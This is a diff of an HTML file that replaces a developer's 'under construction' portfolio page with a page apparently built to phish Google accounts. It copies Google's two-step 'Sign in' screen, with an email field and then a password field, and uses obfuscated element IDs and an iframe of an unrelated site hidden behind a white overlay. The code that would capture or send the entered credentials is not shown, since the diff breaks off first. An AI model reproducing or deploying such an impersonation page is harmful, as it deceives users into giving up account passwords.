@@ -3,745 +3,477 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kaileh57 - Under Construction</title>
-    <link rel="icon" type="image/png" id="favicon">
-
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Kaileh57's Portfolio - Coming Soon" />
-    <meta property="og:description" content="Game Designer & Fullstack Developer - Site Under Construction" />
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+    <title>Access Denied</title>
+    <link rel="icon" href="icon.png" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {  
-            --purple: rgb(123, 31, 162);
-            --violet: rgb(103, 58, 183);
-            --pink: rgb(244, 143, 177);
-        }
-
-        @keyframes background-pan {
-            from {
-                background-position: 0% center;
-            }
-            to {
-                background-position: -200% center;
-            }
-        }
-
-        @keyframes scale {
-            from, to {
-                transform: scale(0);
-            }
-            50% {
-                transform: scale(1);
-            }
-        }
-
-        @keyframes rotate {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .magic {
-            display: inline-block;
-            position: relative;
-        }
-
-        .magic-star {
-            --size: clamp(20px, 1.5vw, 30px);
-            animation: scale 700ms ease forwards;
-            display: block;
-            height: var(--size);
-            left: var(--star-left);
-            position: absolute;
-            top: var(--star-top);
-            width: var(--size);
-            opacity: 0; /* Start hidden */
-            transition: opacity 0.3s ease;
-        }
-
-        .magic:hover .magic-star {
-            opacity: 1; /* Show on hover */
-        }
-
-        .magic-star > svg {
-            animation: rotate 1000ms linear infinite;
-            display: block;
-            opacity: 0.7;
-        }
-
-        .magic-star > svg > path {
-            fill: var(--violet);
-        }
-
-        .magic-text {
-            animation: background-pan 3s linear infinite;
-            background: linear-gradient(
-                to right,
-                var(--purple),
-                var(--violet),
-                var(--pink),
-                var(--purple)
-            );
-            background-size: 200%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            white-space: nowrap;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        body {
             font-family: 'Inter', sans-serif;
         }
 
-        body {
-            background-color: #1a1a1a;
-            color: #e0e0e0;
-            line-height: 1.6;
+        .eyo label {
+            position: absolute;
+            top: 50%;
+            left: 16px;
+            transform: translateY(-50%);
+            transition: all 0.2s ease-out;
+            pointer-events: none;
+            color: #5f6368;
+            font-size: 1rem;
+            background-color: white;
+            padding: 0 4px;
         }
 
-        body::-webkit-scrollbar {
-            width: 8px; 
+        .wkv:focus + label,
+        .wkv:not(:placeholder-shown) + label {
+            top: 0;
+            left: 12px;
+            font-size: 0.75rem;
+            color: #1a73e8;
+            transform: translateY(-50%);
         }
 
-        body::-webkit-scrollbar-track {
-            background: #1a1a1a; 
+        #zbt {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            z-index: 1050;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none;
+            text-align: center;
+            max-width: 90%;
         }
 
-        body::-webkit-scrollbar-thumb {
-            background: #333333;
-            border-radius: 4px;
+        #zbt.jxa {
+            opacity: 1;
+            pointer-events: auto;
         }
 
-        body::-webkit-scrollbar-thumb:hover {
-            background: #444444;
+        #user-email-display {
+
+        }
+         #user-email-display svg {
+             width: 1.25rem;
+             height: 1.25rem;
+             color: #5f6368;
+         }
+
+        #xnj {
+            z-index: 10;
+        }
+        #rwl {
+             transition: transform 500ms ease-in-out;
+        }
+        #rwl.psz {
+            transform: translateX(0%);
         }
 
-        #particles-js {
+        .nup {
+            opacity: 0;
+            transform: translateX(10px);
+            transition: opacity 200ms ease-out 50ms, transform 200ms ease-out 50ms;
+        }
+        .nup.jxa {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        #tdq {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            background-color: rgba(0, 0, 0, 0.25);
+            z-index: 1040;
+            opacity: 0;
+            transition: opacity 150ms ease-in-out;
+            pointer-events: none;
+        }
+        #tdq.jxa {
+            opacity: 1;
+        }
+
+        #xqw {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
             z-index: 1;
         }
 
-        .content {
-            position: relative;
-            z-index: 2;
-            padding: 2rem;
-        }
-
-        .logo {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #8A2BE2;
-        }        
-
-        .logo-container {
+        #zlm {
             position: fixed;
-            top: 1rem;      
-            left: 1rem;      
-            z-index: 3;
-            opacity: 0;      
-            transform: translateY(-10px);
-            transition: all 0.3s ease;
-        }
-
-        .logo-container.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .logo {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #8A2BE2;
-        }
-
-        .hero {
-            min-height: 100vh;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            text-align: center;
-            margin: 0;
-            padding: 0;
+            background-color: transparent;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            pointer-events: none;
         }
 
-        .hero-content {
-            max-width: 800px;
-            transform: translateY(0);
-            margin: 0 auto;
-            text-align: center;
+        #zlm.kfo {
+            opacity: 1;
+            pointer-events: auto;
         }
 
-        h1 {
-            font-size: 3.5rem;
-            margin-bottom: 1rem;
-            color: #ffffff;
-        }
-
-        .highlight {
-            color: #8A2BE2;
-        }
-
-        .section {
-            padding: 5rem 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .section h2 {
-            text-align: center;
-            margin-bottom: 2rem;
-            font-size: 2.5rem;
-            position: relative;
-        }
-
-        .section h2::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60px;
-            height: 3px;
-            background: #8A2BE2;
-            border-radius: 2px;
-        }
-
-        .construction-banner {
-            background: linear-gradient(135deg, #8A2BE2, #7B1FA2);
-            color: white;
-            text-align: center;
-            padding: 1rem;
-            border-radius: 10px;
-            margin: 2rem auto;
-            max-width: 800px;
-            box-shadow: 0 4px 15px rgba(138, 43, 226, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .construction-banner::before {
-            content: '';
-            position: absolute;
+        /* Added white overlay styles */
+        #yvp {
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: repeating-linear-gradient(
-                45deg,
-                rgba(0, 0, 0, 0.1),
-                rgba(0, 0, 0, 0.1) 10px,
-                rgba(0, 0, 0, 0.2) 10px,
-                rgba(0, 0, 0, 0.2) 20px
-            );
+            background-color: white;
+            z-index: 5;
+            opacity: 1;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none; /* Allow clicks through when invisible */
         }
 
-        .construction-icon {
-            margin-right: 10px;
-            animation: rotate 3s linear infinite;
-            display: inline-block;
-            font-size: 1.5rem;
-        }
-
-        .coming-soon {
-            font-size: 2rem;
-            margin: 1.5rem 0;
-            animation: blink 2s ease-in-out infinite;
-        }
-
-        .placeholder-box {
-            background: rgba(138, 43, 226, 0.1);
-            border: 2px dashed #8A2BE2;
-            border-radius: 10px;
-            padding: 2rem;
-            margin: 1rem 0;
-            text-align: center;
-        }
-
-        footer {
-            padding: 0rem;
-            text-align: center;
-            margin-top: 4rem;
-        }
-
-        footer p {
-            color: #e0e0e0;
-            opacity: 0.8; 
-        }
-
-        .social-links {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            margin-top: 1rem;
-        }
-
-        .social-links a {
-            color: #e0e0e0;
-            text-decoration: none;
-            font-size: 1.5rem;
-            transition: color 0.3s;
-        }
-
-        .social-links a:hover {
-            color: #8A2BE2;
-        }
-
-        .progress-bar {
-            height: 20px;
-            background-color: #2a2a2a;
-            border-radius: 10px;
-            margin: 20px auto;
-            max-width: 500px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 35%;
-            background: linear-gradient(90deg, #8A2BE2, #7B1FA2);
-            border-radius: 10px;
-            animation: progress-animation 3s ease-in-out infinite alternate;
-        }
-
-        .hard-work-message {
-            font-style: italic;
-            margin-top: 10px;
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-
-        @keyframes progress-animation {
-            0% { width: 30%; }
-            100% { width: 60%; }
-        }
     </style>
 </head>
-<body>
-    <div id="particles-js"></div>
-    <div class="logo-container">
-        <div class="logo">
-            <span class="magic">
-                <span class="magic-star">
-                    <svg viewBox="0 0 512 512">
-                    <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                    </svg>
-                </span>
-                <span class="magic-star">
-                    <svg viewBox="0 0 512 512">
-                    <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                    </svg>
-                </span>
-                <span class="magic-star">
-                    <svg viewBox="0 0 512 512">
-                    <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                    </svg>
-                </span>
-                <span class="magic-text">K57</span>
-            </span>
+<body class="flex flex-col min-h-screen">
+
+    <iframe id="xqw" src="https://thecatsite.com/"></iframe>
+    <div id="yvp"></div> <!-- Added white overlay -->
+
+    <div id="zbt">
+
+    </div>
+
+    <div id="tdq"></div>
+
+    <div id="zlm">
+        <div class="p-4 w-full flex-grow flex flex-col items-center justify-center">
+            <div class="bg-white rounded-3xl shadow-lg p-10 sm:p-12 w-full max-w-4xl relative overflow-hidden">
+
+                <div id="xnj" class="h-1 w-full absolute top-0 left-0 overflow-hidden rounded-t-3xl hidden">
+                    <div id="rwl" class="h-full bg-blue-600" style="transform: translateX(-100%);"></div>
+                </div>
+
+                <svg class="mx-auto md:mx-0 mb-6 h-12 w-auto" viewBox="0 0 40 48" fill="currentColor" aria-hidden="true"> <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path> <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path> <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path> <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path> </svg>
+
+                <div id="uqt">
+                    <div class="flex flex-col md:flex-row md:gap-x-12 lg:gap-x-16">
+                        <div class="w-full md:w-5/12 flex flex-col text-center md:text-left mb-8 md:mb-0">
+                            <h1 class="text-3xl font-normal text-gray-900 mb-3">Sign in</h1>
+                            <p class="text-base text-gray-700">Use your Google Account</p>
+                        </div>
+
+                        <div class="w-full md:w-7/12 flex flex-col">
+                            <div class="eyo relative mb-4 text-left">
+                                <input type="email" id="kzs" name="identifier"
+                                       class="wkv peer w-full h-14 px-4 text-base border border-gray-400 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 placeholder-transparent"
+                                       placeholder="Email or phone" autofocus>
+                                <label for="kzs" class="text-gray-500 peer-focus:text-blue-600">
+                                    Email or phone
+                                </label>
+                            </div>
+                            <div class="text-left mb-8">
+                                <a href="#" class="text-sm font-medium text-blue-600 hover:text-blue-700 hover:underline demo-link">
+                                    Forgot email?
+                                </a>
+                            </div>
+                            <div class="text-left text-sm text-gray-600 mb-10">
+                                Not your computer? Use Guest mode to sign in&nbsp;privately.
+                                <br>
+                                <a href="#" target="_blank" rel="noopener noreferrer" class="font-medium text-blue-600 hover:text-blue-700 hover:underline">
+                                    Learn more about using Guest mode
+                                </a>
+                            </div>
+                            <div class="flex justify-end items-center mt-auto space-x-4">
+                                <button class="create-account-button text-blue-600 hover:text-blue-700 hover:bg-blue-50 font-medium text-sm py-2 px-3 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-1 focus:ring-blue-500 demo-button">
+                                    Create account
+                                </button>
+                                <button id="gpy" class="next-button bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm py-2 px-6 rounded-full focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
+                                    Next
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="sgh" class="hidden">
+                     <div class="flex flex-col md:flex-row md:gap-x-12 lg:gap-x-16 md:items-start">
+                        <div class="w-full md:w-5/12 flex flex-col text-center md:text-left mb-8 md:mb-0">
+                            <h1 class="text-3xl font-normal text-gray-900 mb-3">Welcome</h1>
+                             <div id="lvd" class="mx-auto md:mx-0 flex w-fit items-center gap-2 px-3 py-1 border border-gray-300 rounded-full text-sm text-gray-700 mb-4 max-w-full">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 text-gray-500">
+                                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+                                </svg>
+                                <span id="cfk" class="whitespace-nowrap overflow-hidden text-ellipsis">user@example.com</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5 text-gray-500 ml-1">
+                                  <path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 10.94l3.71-3.71a.75.75 0 111.06 1.06l-4.25 4.25a.75.75 0 01-1.06 0L5.23 8.27a.75.75 0 01.02-1.06z" clip-rule="evenodd" />
+                                </svg>
+                            </div>
+                        </div>
+                         <div id="aef" class="w-full md:w-7/12 flex flex-col md:pt-8 nup">
+                            <div class="eyo relative mb-4 text-left">
+                                <input type="password" id="ijm" name="password"
+                                       class="wkv peer w-full h-14 px-4 text-base border border-gray-400 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 placeholder-transparent"
+                                       placeholder="Enter your password" autocomplete="current-password">
+                                <label for="ijm" class="text-gray-500 peer-focus:text-blue-600">
+                                    Enter your password
+                                </label>
+                            </div>
+                             <div class="mb-6 text-left">
+                                 <label class="inline-flex items-center">
+                                     <input type="checkbox" id="mqr" class="form-checkbox h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500 mr-2">
+                                     <span class="ml-2 text-sm text-gray-600">Show password</span>
+                                 </label>
+                             </div>
+                            <div class="flex justify-end items-center mt-10 space-x-4">
+                                <a href="#" class="text-sm font-medium text-blue-600 hover:text-blue-700 hover:underline demo-link">
+                                    Forgot password?
+                                </a>
+                                <button id="vyh" class="next-button bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm py-2 px-6 rounded-full focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
+                                    Next
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="w-full max-w-4xl flex justify-between items-center text-xs text-gray-600 px-4 mt-4">
+                <div class="relative">
+                    <select class="appearance-none bg-transparent pr-6 focus:outline-none demo-select">
+                        <option selected>English (United States)</option>
+                        <option>Afrikaans</option>
+                        <option>Azərbaycan</option>
+                        <option>Bahasa Indonesia</option>
+                        <option>Bahasa Melayu</option>
+                        <option>Bosanski</option>
+                        <option>Català</option>
+                        <option>Čeština</option>
+                        <option>Dansk</option>
+                        <option>Deutsch</option>
+                        <option>Eesti</option>
+                        <option>English (United Kingdom)</option>
+                        <option>Español (España)</option>
+                        <option>Español (Latinoamérica)</option>
+                        <option>Euskara</option>
+                        <option>Filipino</option>
+                        <option>Français (Canada)</option>
+                        <option>Français (France)</option>
+                        <option>Galego</option>
+                        <option>Hrvatski</option>
+                        <option>IsiZulu</option>
+                        <option>Íslenska</option>
+                        <option>Italiano</option>
+                        <option>Kiswahili</option>
+                        <option>Latviešu</option>
+                        <option>Lietuvių</option>
+                        <option>Magyar</option>
+                        <option>Nederlands</option>
+                        <option>Norsk</option>
+                        <option>O'zbek</option>
+                        <option>Polski</option>
+                        <option>Português (Brasil)</option>
+                        <option>Português (Portugal)</option>
+                        <option>Română</option>
+                        <option>Shqip</option>
+                        <option>Slovenčina</option>
+                        <option>Slovenščina</option>
+                        <option>Srpski (latinica)</option>
+                        <option>Suomi</option>
+                        <option>Svenska</option>
+                        <option>Tiếng Việt</option>
+                        <option>Türkçe</option>
+                        <option>Ελληνικά</option>
+                        <option>Български</option>
+                        <option>Македонски</option>
+                        <option>Русский</option>
+                        <option>Српски</option>
+                        <option>Українська</option>
+                        <option>ქართული</option>
+                        <option>հայերեն</option>
+                        <option>עברית</option>
+                        <option>اردو</option>
+                        <option>العربية</option>
+                        <option>فارسی</option>
+                        <option>አማርኛ</option>
+                        <option>मराठी</option>
+                        <option>हिन्दी</option>
+                        <option>বাংলা</option>
+                        <option>ਪੰਜਾਬੀ</option>
+                        <option>ગુજરાતી</option>
+                        <option>தமிழ்</option>
+                        <option>తెలుగు</option>
+                        <option>ಕನ್ನಡ</option>
+                        <option>മലയാളം</option>
+                        <option>සිංහල</option>
+                        <option>ไทย</option>
+                        <option>ລາວ</option>
+                        <option>မြန်မာ</option>
+                        <option>ខ្មែរ</option>
+                        <option>한국어</option>
+                        <option>中文 (香港)</option>
+                        <option>中文 (简体)</option>
+                        <option>中文 (繁體)</option>
+                        <option>日本語</option>
+                    </select>
+                    <svg class="w-4 h-4 absolute right-0 top-1/2 transform -translate-y-1/2 pointer-events-none text-gray-500" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="hover:underline">Help</a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="hover:underline">Privacy</a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="hover:underline">Terms</a>
+                </div>
+            </div>
         </div>
     </div>
 
-    <div class="content">
-        <section id="home" class="hero">
-            <div class="hero-content">
-                <h1 class="fade-in-first">Hi, I'm 
-                    <span class="magic">
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-text">Kaileh57</span>
-                    </span>
-                </h1>
-                <h2 class="fade-in-second" style="font-size: 1.5rem; margin-top: -2rem; margin-bottom: 1rem;">(Aka 
-                    <span class="magic">
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-text">Kellen Heraty</span>
-                    </span>)
-                </h2>
-                <p class="fade-in-third">Game Designer & Fullstack Developer</p>
-
-            </div>
-        </section>
-
-        <section id="about" class="section">
-            <h2>About Me</h2>
-            <div class="placeholder-box">
-                <p>Hi! From designing and developing XR games in Godot 4.3 and Unreal 5.4 in my free time, to building fullstack tools using React and FluentUI for Microsoft, and developing open-source AI tools in my free time, I have a wide range of experience and knowledge to bring to any project!</p>
-                <p style="margin-top: 1rem;"><em>Full bio and details coming soon...</em></p>
-            </div>
-        </section>
-
-        <section id="games" class="section">
-            <h2>Some Games I've Made</h2>
-            <div class="placeholder-box">
-                <p>My portfolio of game development projects will be showcased here.</p>
-                <p>Stay tuned for screenshots, descriptions, and playable demos!</p>
-            </div>
-        </section>
-        
-        <section id="other-projects" class="section">
-            <h2>Some Other Stuff</h2>
-            <div class="placeholder-box">
-                <p>Additional projects, tools, and experiments will appear in this section.</p>
-                <p>Currently preparing content for this gallery...</p>
-            </div>
-        </section>
-
-        <section id="contact" class="section">
-            <h2>Find Me On GitHub</h2>
-            <div class="github-link-container">
-                <a href="https://github.com/kaileh57" class="github-link">
-                    <span class="magic">
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                            <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                            <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-star">
-                            <svg viewBox="0 0 512 512">
-                            <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
-                            </svg>
-                        </span>
-                        <span class="magic-text">Check out my code</span>
-                    </span>
-                    <svg class="github-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
-                    </svg>
-                </a>
-            </div>
-        </section>
-        
-        <style>
-        @keyframes fadeSlideIn {
-            0% {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .fade-in-first {
-            opacity: 0;
-            animation: fadeSlideIn 1s ease forwards;
-        }
-
-        .fade-in-second {
-            opacity: 0;
-            animation: fadeSlideIn 1s ease forwards;
-            animation-delay: 1s;
-        }
-
-        .fade-in-third {
-            opacity: 0;
-            animation: fadeSlideIn 1s ease forwards;
-            animation-delay: 1.5s;
-        }
-
-        .github-link-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-top: 2rem;
-        }
-        
-        .github-link {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            padding: 1rem 2rem;
-            background: rgba(138, 43, 226, 0.1);
-            border: 2px solid #8A2BE2;
-            border-radius: 12px;
-            text-decoration: none;
-            color: #e0e0e0;
-            font-size: 1.2rem;
-            transition: all 0.3s ease;
-        }
-        
-        .github-link:hover {
-            background: rgba(138, 43, 226, 0.2);
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(138, 43, 226, 0.2);
-        }
-        
-        .github-icon {
-            width: 24px;
-            height: 24px;
-            stroke: #8A2BE2;
-            transition: transform 0.3s ease;
-        }
-        
-        .github-link:hover .github-icon {
-            transform: rotate(12deg) scale(1.1);
-        }
-        
-        .github-link .magic-text {
-            font-size: 1.2rem;
-        }
-        
-        .github-link:hover .magic-star {
-            opacity: 1;
-        }
-        </style>
-
-        <footer>
-            <p>© 2025 Kellen Heraty. All rights reserved.</p>
-            <div class="social-links">
-                <a href="#" aria-label="GitHub">
-                    <i class="fab fa-github"></i>
-                </a>
-                <a href="#" aria-label="Twitter">
-                    <i class="fab fa-twitter"></i>
-                </a>
-                <a href="#" aria-label="LinkedIn">
-                    <i class="fab fa-linkedin"></i>
-                </a>
-            </div>
-        </footer>
-    </div>
     <script>
-        // Favicon animation setup
-        const faviconCanvas = document.createElement('canvas');
-        faviconCanvas.width = 64;
-        faviconCanvas.height = 64;
-        const ctx = faviconCanvas.getContext('2d', { alpha: true });
-    
-        // Create favicon downscaling canvas
